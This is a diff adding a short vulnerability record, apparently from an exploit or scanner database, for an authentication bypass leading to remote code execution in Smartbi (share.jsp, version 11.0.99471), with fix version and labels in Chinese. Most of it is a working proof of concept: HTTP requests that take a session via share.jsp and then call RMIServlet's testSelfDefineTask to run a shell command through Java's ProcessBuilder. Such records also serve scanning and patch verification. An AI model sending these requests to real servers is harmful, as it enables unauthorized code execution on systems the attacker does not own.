@@ -1,0 +1,15 @@
+vendor = "Smartbi"
+name = "Smartbi share.jsp 认证绕过导致远程代码执行漏洞"
+type = "认证绕过+远程代码执行"
+path = "/smartbi/vision/share.jsp"
+version = "11.0.99471"
+detail = """GET /smartbi/vision/share.jsp?resid=96a0a9d0b86f90d5416d013f4cfe2f23 HTTP/1.1 Host: target
+
+POST /smartbi/vision/RMIServlet HTTP/1.1 Host: target Cookie: JSESSIONID=<session> Content-Type: application/x-www-form-urlencoded
+
+className=ScheduleSDK&methodName=testSelfDefineTask&params=["1","1","1","(new Packages.java.lang.ProcessBuilder("whoami")).start();","admin",""]"""
+fix = "升级至 11.0.99471.25193"
+date = 20250821
+label = "nday"
+cve = "TVD-2026-XXXXX"
+verifier = "AdySec"
